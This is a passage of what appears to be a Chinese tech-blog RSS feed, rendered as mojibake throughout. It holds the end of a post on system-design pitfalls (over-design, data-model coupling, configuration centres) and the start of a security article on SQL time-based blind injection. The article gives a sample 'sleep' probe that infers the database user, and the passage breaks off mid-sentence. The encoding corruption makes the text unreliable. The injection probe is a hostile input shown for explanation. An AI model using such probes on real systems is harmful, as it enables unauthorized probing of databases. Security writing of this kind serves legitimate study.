æ­»éœ€æ±‚æ”¹æ¥æ”¹å»å’Œæ–°éœ€æ±‚åˆ†åˆ†é’Ÿå†’å‡ºæ¥çš„äº§å“ç»ç†ï¼Œå¯¹å˜›ï¼Ÿ&lt;/p&gt;&lt;h2&gt;&lt;b&gt;è®¾å®šæ•°æ®è½¬æ¢åè®®æˆ–è€…æ•°æ®è·å–åè®®&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è¿™ç§æ–¹æ³•å…¶å®æ˜¯å¯ä»¥æå¤§ç¨‹åº¦ä¸Šç¼“è§£åœ¨ä¸Šä¸€ç§æ–¹æ³•ä¸­æåˆ°çš„&lt;/p&gt;&lt;blockquote&gt;æ—¥ç›Šå¢é•¿çš„å®¢æˆ·ä¸šåŠ¡æ–¹éœ€æ±‚ä¸ç°é˜¶æ®µæ—§çš„æ¨¡å‹ä¹‹é—´çŸ›ç›¾&lt;/blockquote&gt;&lt;p&gt;Qï¼šè¿™ç§æ–¹æ³•å’Œä¸Šä¸€ç§æœ‰ä»€ä¹ˆæœ¬è´¨åŒºåˆ«ï¼Ÿ&lt;/p&gt;&lt;p&gt;Aï¼šè¡¨é¢ä¸Šçœ‹å…¶å®æœ€å¤§çš„ä¸åŒæ˜¯å¢åŠ äº†ä¸€ä¸ªä¸­é—´æ¨¡å‹ï¼Œä½†æ˜¯æ°æ°æ˜¯è¿™ä¸€ä¸ªä¸­é—´æ¨¡å‹ï¼Œä¼šè®©éœ€æ±‚æ–¹æ´æ‚‰åŸå§‹æ•°æ®æ‰€æœ‰å¯ä»¥æä¾›çš„æ•°æ®ï¼Œå¹¶ä¸”ä¸éœ€è¦é€šè¿‡æ¯ä¸€ä¸ªéœ€æ±‚éƒ½çº¦å®š APIï¼Œè€Œæ˜¯ç›´æ¥åœ¨ä¸­é—´æ¨¡å‹ä¸Šæ„å»ºä¸šåŠ¡æ¨¡å‹ï¼›é™¤éæ–°çš„éœ€æ±‚å¹¶ä¸æ˜¯åœ¨ç°æœ‰çš„åŸå§‹æ•°æ®ä¸Šå¯ä»¥æ»¡è¶³çš„ï¼Œè¿™ä¸ªæ—¶å€™æ‰éœ€è¦è¿›è¡Œæ²Ÿé€šï¼Œæ‰©å……ä¸­é—´æ¨¡å‹ã€‚æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒåŸå§‹æ•°æ®çš„å¤šæ ·æ€§ä¸éœ€è¦é¢‘ç¹å‘ä¸šåŠ¡æ•°æ®è¿›è¡Œå¦¥åã€‚&lt;/p&gt;&lt;p&gt;è¿™ç§è§£å†³æ–¹æ¡ˆå…¶å®ä¹Ÿå¹¶ä¸åªæ˜¯ä¸€ç§è®¾æƒ³ï¼Œåœ¨æŸäº›é¢†åŸŸå’Œå·¥ç¨‹åº”ç”¨ä¸­å·²ç»å®ç°ï¼Œå¹¶ä¸”å–å¾—äº†éå¸¸è‰¯å¥½çš„å¼€å‘ä½“éªŒï¼›ç¬”è€…è®¤ä¸ºè¿™ç§ç§‘å­¦çš„æ–¹æ³•å…¶å®æœ¬æ¥å°±å·²ç»è¢«å¾ˆå¥½å®è·µå’Œç†è®ºåŒ–ï¼ˆProxy-Patternï¼‰äº†ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;AMQP ä¸­ Exchange çš„è®¾è®¡&lt;/li&gt;&lt;li&gt;GraphQL è®¾è®¡&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 ç³»ç»Ÿè®¾è®¡ä¼ªéœ€æ±‚ vs Over-designed&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Over-designed å°±æ˜¯è¿‡åº¦è®¾è®¡ï¼Œæ˜¯åœ¨è¿›è¡Œå®ç°çš„æ—¶å€™æ²¡æœ‰æ­£ç¡®æŠŠæ¡å¤æ‚åº¦å¯¼è‡´äº†å¤šä½™çš„è®¾è®¡ã€‚&lt;/p&gt;&lt;p&gt;å…¶å®åœ¨è¿™ä¸ªè¯é¢˜ä¸­ï¼Œâ€œä¼ªéœ€æ±‚â€ ä¸ Over-designed çš„çŸ›ç›¾å¹¶ä¸åªå‘ç”Ÿåœ¨è°ƒåº¦ç³»ç»Ÿä¸­ï¼Œåè€Œæ˜¯åœ¨å¾ˆå¤šåœ°æ–¹ï¼Œéƒ½ä¼šå‘ç”Ÿ Over-desighed çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;ul&gt;&lt;li&gt;åº•å±‚æƒ³æä¾›æ›´å¤šçš„ Useless çš„åŠŸèƒ½å¯¼è‡´åº•å±‚ Over-designed &lt;/li&gt;&lt;li&gt;åº”ç”¨æœåŠ¡å¤„ç†ä¸å¥½ Infrastructures ä¸ä¸šåŠ¡é€»è¾‘ä¹‹é—´çš„å…³ç³»å¯¼è‡´ Over-designed&lt;/li&gt;&lt;li&gt;è¢«é«˜ä¼°çš„å¯é æ€§éœ€æ±‚å¯¼è‡´ Over-designed&lt;/li&gt;&lt;li&gt;hype-driven development&lt;/li&gt;&lt;li&gt;...&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;åœ¨è¿™ä¸ªè¯é¢˜ä¸­ï¼Œæˆ‘ä»¬å…¶å®å¾ˆéš¾åƒç¬¬ä¸€ä¸ªè¯é¢˜ä¸€æ ·ï¼Œæå‡ºæ˜ç¡®çš„æ–¹æ³•å»ç¼“è§£â€œä¼ªéœ€æ±‚â€å¸¦æ¥çš„ Over-designedã€‚ä»ä¸€å¼€å§‹æ¥è§¦ Code ç›´åˆ°ç°åœ¨ï¼Œæˆ‘ä¸€ç›´éš¾ä»¥æŠ›å¼ƒæ‰ä¸€ä¸ªä¿¡å¿µï¼Œå°±æ˜¯å¯¹è‡ªå·±ä»£ç è¿‡åˆ†çš„é«˜ä¼°å’Œå¤šä¸šåŠ¡çš„è¿‡åˆ†é«˜ä¼°ã€‚æˆ‘è§‰å¾—è¿™å…¶å®æ›´å¤šçš„æ˜¯ä¸€ç§è¯±æƒ‘ï¼Œæ¯”å¦‚ HDDï¼ˆHype-Driven Developmentï¼‰å¯¹æˆ‘æ¥è¯´ä¸€ç›´æ˜¯å¾ˆå¤§çš„è¯±æƒ‘ã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶æˆ‘åœ¨è¿™ä¸ªè¯é¢˜ä¸­è¯´åˆ°çš„â€œä¼ªéœ€æ±‚â€å¹¶ä¸æ˜¯äº§å“ç»ç†è¯´çš„â€œä¸šåŠ¡ä¼ªéœ€æ±‚â€ï¼Œè€Œæ˜¯å¯¹ç³»ç»Ÿçš„æŸä¸€ä¸ª Feature æ²¡æœ‰åšåˆ°æ­£ç¡®ä¼°è®¡å…¶ç´§æ€¥ç¨‹åº¦æˆ–è€…å¯é ç¨‹åº¦ï¼Œå‡­ç©ºç»™è‡ªå·±å¢åŠ äº†ä¸€äº›â€œè´Ÿæ‹…â€ã€‚è¿™æ ·çš„é—®é¢˜å¾ˆå®¹æ˜“å¯¼è‡´ä»£ç å†—ä½™ï¼Œè¿‡åˆ†è¿½æ±‚è®¾è®¡ï¼›æˆ–è€…å› ä¸ºè‡ªå·±è§‰å¾—è¿™ä¸ª Feature ç›¸å…³è”çš„åˆ«çš„ Feature å¯èƒ½éœ€è¦åœ¨ä¸ä¹…çš„æœªæ¥å®ç°ï¼Œè€Œè‡ªå·±èŠ±äº†æ›´å¤šçš„ç²¾åŠ›å’Œæ—¶é—´åœ¨å¹¶ä¸æ˜¯è¿™ä¸€é˜¶æ®µçš„å·¥ä½œä¸Šã€‚æˆ‘ç®¡è¿™ç§â€œä¼ªéœ€æ±‚â€å«ä½œâ€œè´Ÿæ‹…â€å…¶å®æ˜¯ä¸å¤ªå¦¥å½“çš„ï¼Œä»–å…¶å®å¹¶ä¸æ˜¯çœŸçš„è´Ÿæ‹…ï¼Œåè€Œæœ‰æ—¶å€™ï¼Œå¯¹äºä¸€ä¸ªçƒ­çˆ±ç¼–ç¨‹çš„ Coder æ¥è¯´ï¼Œå®ƒä¼šæˆä¸ºä¸€ç§æœ‰æ¯’çš„è¯±æƒ‘ã€‚&lt;/p&gt;&lt;p&gt;å­¦ä¼šæŠµåˆ¶è¯±æƒ‘ä¸å» Over-designedï¼Œå­¦ä¼šâ€å¤§é“è‡³ç®€â€œæˆ‘ç›¸ä¿¡å¯¹äºæ¯ä¸€ä¸ª Coder æ¥è¯´éƒ½ä¼šæ˜¯ä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ã€‚&lt;/p&gt;&lt;p&gt;è¯´åˆ°è¿™ä¸ªï¼Œå¯èƒ½éœ€è¦å†è®²ä¸€ä¸ªä¾‹å­ï¼šå¾®æœåŠ¡æœ‰ä¸€ä¸‡ç§ç¾å¥½çš„ç‰¹æ€§ï¼Œä½†æ˜¯çœŸçš„æ‰€æœ‰çš„ç³»ç»Ÿéƒ½ä½¿ç”¨å¾®æœåŠ¡å°±ä¸€å®šå¥½å—ï¼Ÿææ€•è¿™é‡Œæ˜¯æœ‰å¾ˆå¤§é—®é¢˜çš„ã€‚æœåŠ¡ç°‡çš„ç»´æŠ¤éœ€è¦æˆæœ¬ï¼ŒæœåŠ¡çš„ç ”å‘ä¹Ÿéœ€è¦æˆæœ¬ï¼Œç§‘å­¦çš„åè®®è®¾è®¡ï¼Œé…ç½®ä¸­å¿ƒï¼Œåè°ƒä¸­å¿ƒï¼ŒDevOps éƒ½éœ€è¦æˆæœ¬ã€‚ä¸€ä¸ª Passion Coder è‡ªç„¶æ˜¯éå¸¸çƒ­çˆ±è¿™ç§ Cloud Native å’Œè¯¸å¤šç‰¹æ€§çš„æ–°æŠ€æœ¯ï¼Œä½†æ˜¯æ²¡æœ‰å›¢é˜Ÿæˆ–è€…å›¢é˜Ÿèµ„æºä¸å¤Ÿï¼Œäººä¸å¤Ÿï¼Œéƒ½æ²¡æœ‰åŠæ³•æ”¯æ’‘å¾®æœåŠ¡è¿™ç§é«˜å¤æ‚åº¦çš„åˆ†å¸ƒå¼ç³»ç»Ÿï¼›å¦å¤–ï¼Œæ›´éœ€è¦å€¼å¾—æ€è€ƒçš„æ˜¯ï¼Œä½ æ­£åœ¨å¼€å‘çš„ç³»ç»Ÿå€¼ä¸å€¼å¾—å¾®æœåŠ¡ï¼Ÿå½“ç„¶ï¼Œå¯èƒ½ä½ çš„éœ€æ±‚æ–¹çªç„¶ç æ‰äº†å¾ˆå¤šå¾ˆå¤šåŠŸèƒ½ï¼Œä½ çš„ç³»ç»Ÿçªç„¶ä¸éœ€è¦å¾®æœåŠ¡äº†ï¼Œå› æ­¤ä½ éœ€ä¸éœ€è¦æ¨å€’é‡æ¥ï¼Ÿè¿˜æ˜¯ç®€å•è½¬ä¸º SOAï¼Ÿè¿™äº›å…¶å®éƒ½æ˜¯ä¸€ä¸ªåˆæ ¼çš„ Coder éœ€è¦æ€è€ƒçš„é—®é¢˜ï¼Œå¹¶ä¸åªæ˜¯å­¦ä¹ æ–°æŠ€æœ¯ï¼Œé‡‡ç”¨æ–°ç‰¹æ€§ã€‚&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&quot;&gt;https://aadrake.com/posts/2017-05-20-enough-with-the-microservices.html&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;æ‰€ä»¥æˆ‘ç®¡è¿™ä¸ªå«ä½œâ€œè¯±æƒ‘â€ï¼Œåè€Œï¼Œè¶Šæ˜¯å¯¹æŠ€æœ¯è¿½æ±‚è¶Šå¤šè¶Šæ˜¯å®¹æ˜“å—åˆ° Over-designed çš„å½±å“ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03 Service-Oriented Architecture vs è€¦åˆç—›ç‚¹&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;è€¦åˆè¿™ä¸ªè¯ä¼´éšæˆ‘ç¬¬ä¸€æ¬¡ç¨‹åºè®¾è®¡è¯¾ç¨‹ä¸€ç›´åˆ°ç°åœ¨ï¼Œä»å¾®è§‚ä»£ç çš„ç±»ä¹‹é—´çš„è€¦åˆä¸€ç›´åˆ°æœåŠ¡ä¹‹é—´è€¦åˆï¼Œè®¾è®¡ä¸Šçš„è€¦åˆï¼Œç”šè‡³é…ç½®ä¹‹é—´çš„è€¦åˆï¼Œä¸€æ­¥ä¸€æ­¥èµ°æ¥ï¼›ä»æ€è€ƒä¸­ï¼Œä¹Ÿæœ‰äº†å¾ˆå¤šè§£å†³æ–¹æ³•ï¼Œä¸ç®¡æœ‰æ²¡æœ‰ä»˜è¯¸å®ç°ï¼Œæˆ‘è§‰å¾—è¿™äº›éƒ½æ˜¯å¾ˆæœ‰ä»·å€¼çš„å€¼å¾—è®¨è®ºçš„é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;æœ¬æ–‡æè¿°çš„åœºæ™¯æ˜¯ç»“åˆä¸Šä¸€ç¯‡æ–‡ç« ä½¿ç”¨äº†æ¶ˆæ¯é˜Ÿåˆ—ä½œä¸ºé€šä¿¡åŸºç¡€æœåŠ¡ï¼ŒæœåŠ¡ä¹‹é—´é€šä¿¡éœ€è¦é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—ã€‚å› æ­¤ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„æœåŠ¡ä¹‹é—´çš„è€¦åˆåº”è¯¥æ˜¯å¿…é¡»æœ‰é€šä¿¡åè®®è€¦åˆçš„ï¼Œè¿™æ˜¯å¿…é¡»çš„ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ª Topic ä¸­è®¨è®ºå…¶ä»–çš„é—®é¢˜ï¼š&lt;/p&gt;&lt;h2&gt;&lt;b&gt;ä¸èƒ½åœ¨æ•°æ®æ¨¡å‹ä¸Šè€¦åˆ&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;Aï¼šâ€œæˆ‘è´Ÿè´£çš„è¿™ä¸ªæœåŠ¡çš„æ•°æ®æ€ä¹ˆä¼ ç»™ä½ å‘¢ï¼Ÿâ€&lt;br&gt;Bï¼šâ€œè¦ä¸æˆ‘æŠŠ Postgres çš„ç«¯å£æš´éœ²å‡ºæ¥ï¼Œä½ ç›´æ¥å†™åˆ°æ•°æ®åº“å§â€&lt;br&gt;Aï¼šâ€œModels å°±çœ‹ Git ä¸Šæˆ‘çš„ä»£ç ï¼ŒCOPY åˆ°ä½ é‚£é‡Œå°±å¯ä»¥â€&lt;br&gt;å®Œæˆä¹‹åï¼Œè¿‡äº†å‡ å¤©ï¼Œå› ä¸ºéœ€æ±‚å˜åŠ¨ï¼Œæ•°æ®æ¨¡å‹éœ€è¦ä¿®æ”¹â€¦â€¦&lt;br&gt;Bï¼šâ€œæˆ‘éœ€è¦æ”¹ Modelsï¼Œä½ é‚£é‡Œå¯èƒ½ä¹Ÿéœ€è¦æ”¹æ”¹ä»£ç â€&lt;br&gt;Aï¼šâ€œâ€¦çŒ«çŒ«ç¢°.jpgâ€&lt;br&gt;Bï¼šâ€œæˆ‘çš„ Migration æ€ä¹ˆè€æœ‰é—®é¢˜ï¼Ÿæ˜¯ä¸æ˜¯ A åŠ¨äº† Modelsï¼Ÿâ€&lt;br&gt;Aï¼šâ€œ..ä¸ï¼Œæˆ‘æ²¡æœ‰ï¼Œåˆ«çè¯´å•Š.jpgâ€&lt;/blockquote&gt;&lt;p&gt;è¿™æ ·çš„å¯¹è¯ï¼Œç¡®ç¡®å®å®æ˜¯ç°å®ä¸­å‘ç”Ÿçš„ï¼Œè¿™ä¸ªæ•°æ®æ¨¡å‹ç‰µæ‰¯åˆ°äº†ä¸¤ä¸ªä¸åŒçš„æœåŠ¡åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå®šä¹‰çš„ä¿®æ”¹ï¼ŒFeature å’Œéœ€æ±‚çš„å¢åŠ ï¼Œéƒ½ä¼šå¯¼è‡´ç›´æ¥çš„ä¸è¿™ä¸ªæ¨¡å‹ç›¸å…³è”çš„æœåŠ¡çš„ä»£ç çš„æ”¹åŠ¨ï¼›é€ æˆè¿™æ ·çš„é—®é¢˜åªæ˜¯èµ·åˆä¸ºäº†æ–¹ä¾¿ä¸¤ä¸ªæœåŠ¡ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆæ—¢ç„¶å·²ç»æœ‰äº†é€šä¿¡ç³»ç»Ÿï¼Œä¸ºä»€ä¹ˆä¸èƒ½ç”¨æ¥å®šä¹‰é€šä¿¡åè®®æ¥ä¼ è¾“æ•°æ®å‘¢ï¼Œç»´æŠ¤ä¸€å¥—è€¦åˆæ–¹å¼æ€»è¦æ¯”åŒæ—¶å…¼é¡¾é€šä¿¡åè®®å’Œæ•°æ®åº“æ›´è½»æ¾å§ã€‚å¦å¤–åœ¨æ•°æ®åº“è€¦åˆä¼šé€ æˆæ›´å¤šå¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šä¸€æ–¹ä½¿ç”¨ ORM ä¸€æ–¹æ²¡æœ‰ä½¿ç”¨ ORMï¼Œæˆ–è€…åŒæ–¹ ORM å¯¹æ•°æ®åº“ä¸åŒçš„æ“ä½œå¯¼è‡´å†²çªï¼Œç”šè‡³è¯´ä»»æ„ä¸€ä¸ªæœåŠ¡åœ¨æ•°æ®åº“æ“ä½œä¸Šçš„å°é—®é¢˜éƒ½ä¼šå½±å“åˆ°å…¶ä»–æœåŠ¡ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;é…ç½®ä¸­å¿ƒçš„å¿…è¦æ€§&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;Aï¼šâ€œéœ€è¦æµ‹è¯•ç¯å¢ƒæ”¹ç‚¹é…ç½®ï¼Œæˆ‘ä»¬çš„ MQ æœåŠ¡å™¨è¿ç§»äº†â€&lt;br&gt;Bï¼šâ€œé‚£ä¹ˆå‡ ä¸ªèŠ‚ç‚¹çš„é…ç½®å¯èƒ½éƒ½éœ€è¦æ”¹åŠ¨ä¹‹åé‡æ–°å¯åŠ¨â€&lt;br&gt;Aï¼šâ€œOrzâ€¦â€¦æ±‚ä¸€å‘æ‰¹é‡æ“ä½œè„šæœ¬â€&lt;/blockquote&gt;&lt;p&gt;æˆ‘æƒ³ä¸åªæ˜¯æˆ‘ä»¬ï¼Œå¯èƒ½æ‰€æœ‰çš„é¡¹ç›®éƒ½ä¼šé‡åˆ°è¿™ç§é—®é¢˜ï¼Œå†…ç½‘ä¸€ä¸ªæœåŠ¡çš„è¿ç§»ç›´æ¥å¯¼è‡´äº†å¤§æ‰¹é…ç½®æ–‡ä»¶éœ€è¦æ”¹åŠ¨ï¼›æŸä¸€é¡¹é…ç½®çš„æ”¹åŠ¨ï¼Œéœ€è¦ç‰µè¿ä¸€å¤§æ‰¹é…ç½®æ–‡ä»¶å†…å®¹çš„ä¿®æ”¹ã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶ï¼ŒIP è¿ç§»çš„é—®é¢˜ç›¸å¯¹æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒå¥½è§£å†³çš„ï¼Œåªéœ€è¦å†…ç½‘ DNS å¯ä»¥è§£æåˆ°æ–°è¿ç§»çš„æœºå™¨ä¸Šå°±å¯ä»¥äº†ï¼›ä½†æ˜¯æŸä¸€é¡¹é…ç½®çš„æ”¹åŠ¨å¯¼è‡´çš„å…³è”é—®é¢˜ï¼Œå¯å¹¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“èƒ½è§£å†³çš„ã€‚&lt;/p&gt;&lt;p&gt;å½“ç„¶ä¹Ÿå¹¶ä¸æ˜¯æ²¡æœ‰åŠæ³•è§£å†³ï¼šé…ç½®ä¸­å¿ƒå’Œæ­£ç¡®çš„é…ç½®ä¸­å¿ƒå®¢æˆ·ç«¯å°±å¯ä»¥è§£å†³è¿™ç§é—®é¢˜ã€‚ï¼ˆå¦‚æœä½ çš„é…ç½®ä¸­å¿ƒä¹Ÿè¦è¿ç§»ï¼Œé‚£å°±çˆ±è«èƒ½åŠ©äº†å§ï¼‰&lt;/p&gt;&lt;p&gt;é…ç½®ä¸­å¿ƒå…¶å®ä¹Ÿå¹¶ä¸åªæ˜¯å¯ä»¥ç”¨æ¥å…³ç³»é…ç½®ï¼ŒæœåŠ¡çš„æ³¨å†Œï¼Œè‡ªåŠ¨å‘ç°ï¼Œç”šè‡³ä¸€äº›æœåŠ¡åŸºç¡€ä¿¡æ¯çš„åŒæ­¥ï¼Œé›†ç¾¤ç®¡ç†éƒ½å¯ä»¥é€šè¿‡é…ç½®ä¸­å¿ƒæ¥åšã€‚åœ¨å®è·µä¸­ï¼ŒEtcd å’Œ Zookeeper åº”ç”¨çš„ç›¸å¯¹æ¯”è¾ƒå¤šï¼Œä»¥ Zookeeper ä¸ºä¾‹ï¼Œåœ¨æˆ‘ä¸ªäººçš„ä½¿ç”¨ä¸­å…¶å®æ— æ‰€è°“ä½ æœ¬èº«åº”ç”¨æœåŠ¡ç©¶ç«Ÿæ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™ï¼ŒZookeeper å®¢æˆ·ç«¯ä¸€èˆ¬éƒ½æœ‰ç›¸åº”çš„è¯­è¨€ç»‘å®šï¼Œåœ¨ acl å’Œ ZK é…ç½®å¾—å½“çš„æƒ…å†µä¸‹ï¼Œå®Œå…¨å¯ä»¥åšåˆ°ä¿æŒé…ç½®æ–‡ä»¶æˆ–è€…å…³é”®æ•°æ®åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„ä¸€è‡´æ€§ï¼Œçƒ­æ›´æ–°ï¼Œçƒ­è¿ç§»ï¼Œå¹¶ä¸”ä¿è¯ä¸€å®šçš„å®‰å…¨æ€§ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;å…¬å…±ä»£ç çš„è€¦åˆä¸ Infrastructure&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;é™¤äº†ä¸Šé¢æåˆ°çš„æ›´å¤šçš„ä¸Šå±‚çš„è€¦åˆçš„é—®é¢˜ï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­ä»£ç çš„è€¦åˆé—®é¢˜è™½ç„¶æ›´ä¸å¼•äººæ³¨æ„ï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨çš„éšæ‚£ä¾ç„¶æ˜¯å……æ»¡å¨èƒã€‚æœ€å…·æœ‰ä»£è¡¨æ€§çš„ä¾‹å­å…¶å®å°±æ˜¯ä¸€äº›åŸºç¡€è®¾æ–½å…¬ç”¨åº“çš„é—®é¢˜ï¼Œè¿™äº›å°è£…æˆäº†å…¬å…±åº“çš„ä»£ç å…¶å®ä¹Ÿæ˜¯åœ¨è¿­ä»£æ›´æ–°çš„ï¼Œå› æ­¤ï¼Œå¦‚æœè¯´å› ä¸ºæŸä¸€ä¸ªæœåŠ¡çš„ç‰¹æ®Šéœ€æ±‚å¯¼è‡´å…¬ç”¨ä»£ç çš„æ¥å£å˜åŠ¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…¶ä»–æœåŠ¡ä½¿ç”¨å…¬ç”¨åº“çš„ä»£ç ä¹Ÿè¦å‘ç”Ÿå˜åŠ¨ã€‚&lt;/p&gt;&lt;p&gt;ä½†æ˜¯ä¹Ÿå¹¶ä¸æ„å‘³ç€è¿™æ ·çš„é—®é¢˜æ˜¯éš¾ä»¥é¿å…çš„ï¼Œå°±å…¬ç”¨ä»£ç è€Œè¨€ï¼Œè¦é¿å…è¿™ç§å°´å°¬çš„é—®é¢˜ï¼Œæ¯”è¾ƒå¥½çš„æ–¹å¼å…¶å®æ˜¯é”ç‰ˆæœ¬ã€‚æ²¡é”™ï¼Œå†…éƒ¨å…¬ç”¨çš„ä»£ç åº“çš„å‘å¸ƒä¹Ÿåº”è¯¥æ˜¯æœ‰ç‰ˆæœ¬çš„ï¼Œåœ¨ä¸€ä¸ªæœåŠ¡ Stable çš„æ—¶å€™ï¼Œä»–çš„ä½¿ç”¨çš„å…¬ç”¨ä»£ç åº“å’ŒåŸºç¡€è®¾æ–½çš„åº“ä¸€æ ·éƒ½æ˜¯é”å®šç‰ˆæœ¬ï¼Œé¿å…å› ä¸ºå…¬ç”¨ä»£ç çš„æ›´æ–°å¯¼è‡´æœåŠ¡å‡ºç°å¼‚å¸¸ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04 Outro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“ç„¶åœ¨å®é™…çš„é¡¹ç›®ä¸­ï¼Œé‡åˆ°çš„é—®é¢˜å¹¶ä¸åªè¿™ä¹ˆå¤šã€‚åœ¨æœ¬æ–‡æˆ‘åªæ˜¯ç‰¹æ„é€‰æ‹©äº†ä¸‰ä¸ªå¾ˆå…·æœ‰ä»£è¡¨æ€§çš„æ–¹é¢æ¥å‘è¡¨ä¸€äº›è‡ªå·±æ‹™åŠ£çš„è§è§£ï¼Œå¸Œæœ›å¯ä»¥æŠ›ç –å¼•ç‰ï¼Œå¼•æ¥å¤§ä½¬ä¸€èµ·äº¤æµ ;-)&lt;/p&gt;</description>
<author>å°è˜‘è‡</author>
<guid isPermaLink="false">2018-04-16-35751510</guid>
<pubDate>Mon, 16 Apr 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>ä¸€ç§æ–°å‹SQLæ—¶é—´ç›²æ³¨æ”»å‡»æ¢ç´¢</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-03-35245598.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35245598&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0cd460758b08a7f1950d7ee754c468f5_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/879a0dd1ccf71649de0eeb3327f42f59&quot; data-hash=&quot;879a0dd1ccf71649de0eeb3327f42f59&quot; data-hovercard=&quot;p$b$879a0dd1ccf71649de0eeb3327f42f59&quot;&gt;@do9gy&lt;/a&gt; &lt;/p&gt;&lt;p&gt;ç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œé•¿æœŸä»äº‹æ¸—é€æµ‹è¯•ï¼ŒWAFæ”»é˜²å¯¹æŠ—å·¥ä½œï¼Œå–œæ¬¢å°ç‹—ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;SQLæ³¨å…¥æ¼æ´ç”±æ¥å·²ä¹…ï¼Œå…³äºç›²æ³¨æ–¹é¢ä¸€ç›´éƒ½æ˜¯å®‰å…¨çˆ±å¥½è€…å–œæ¬¢ç ”ç©¶çš„è¯é¢˜ã€‚è®°å¾—æœ€æ—©äº†è§£åˆ°DNSå¤–ä¼ çš„æ€è·¯æ˜¯åœ¨oldjunçš„åšå®¢ï¼Œå½“æ—¶è¢«è¿™ç§æŠ€å·§æ‰€å¸å¼•ï¼Œä¸è¿‡è¯¥æ–¹æ³•ä¾èµ–äºmysqlç‰ˆæœ¬å’Œwindowç¯å¢ƒçš„é™åˆ¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;é¦–å…ˆä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯SQLç›²æ³¨&lt;/h2&gt;&lt;blockquote&gt;åœ¨SQLæ³¨å…¥ä¸­ï¼Œå¾€å¾€éœ€è¦å¼•å…¥â€œè¶…å‡ºé¢„æœŸâ€çš„SQLè¯­å¥ï¼Œæœ€å¥½æ˜¯å¸Œæœ›å°†â€œé¢å¤–â€çš„æŸ¥è¯¢å†…å®¹ç›´æ¥æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œä½¿ç”¨çš„æ‰‹æ³•æœ‰ï¼šâ€œæŠ¥é”™æŸ¥è¯¢ï¼ˆerror-basedï¼‰â€ã€â€œè”åˆæŸ¥è¯¢ï¼ˆunion-selectï¼‰â€ã€‚å¯¹äºæ— æ³•ç›´æ¥å›æ˜¾å‡ºå†…å®¹çš„æƒ…å†µéœ€è¦ä¾èµ–trueï¼falseå·®å¼‚åˆ¤æ–­ï¼ˆbooleanï¼‰ã€æ—¶é—´å¯¹æ¯”ï¼ˆtime-basedï¼‰ã€DNSå¤–ä¼ æ•°æ®æŸ¥è¯¢ï¼ˆdata exfiltration through DNS channelï¼‰ç­‰æ–¹æ³•è¿›è¡Œæ•è·ã€‚ä¾‹å¦‚ï¼šâ€œselect if(user()=&#39;root@localhost&#39;,sleep(4),null)â€œ å½“ç½‘ç«™ç”¨æˆ·æ˜¯â€root@localhostâ€œæ—¶ï¼Œä¼šå»¶é•¿4ç§’é’Ÿåè¿”å›ç»“æœï¼Œå½“ç”¨æˆ·ä¸æ˜¯â€root@localhostâ€œæ—¶ï¼Œä¼šç«‹å³è¿”å›ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­ç³»ç»Ÿä¸­çš„ç”¨æˆ·ï¼Œåˆ©ç”¨åŒæ 